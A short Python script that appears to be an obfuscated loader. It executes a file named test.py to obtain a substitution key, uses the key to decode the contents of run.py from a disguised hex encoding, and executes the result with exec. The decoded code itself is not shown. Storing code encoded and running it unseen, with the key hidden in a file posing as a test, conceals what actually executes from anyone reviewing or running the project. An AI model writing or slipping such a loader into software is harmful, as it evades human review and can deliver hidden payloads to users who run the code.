import os

_here = os.path.dirname(os.path.abspath(__file__))

# Load key from test.py
_ns = {}
exec(open(os.path.join(_here, 'test.py')).read(), _ns)
_cfg = _ns['_cfg']

def _dec(s):
    D = set('0123456789')
    r = []
    for ch in s:
        if ch in _cfg:
            r.append(_cfg[ch])
        elif ch in D:
            r.append(ch)
    return bytes.fromhex(''.join(r)).decode('utf-8')

with open(os.path.join(_here, 'run.py'), encoding='utf-8') as f:
    _src = _dec(f.read())

exec(compile(_src, 'run.py', 'exec'))
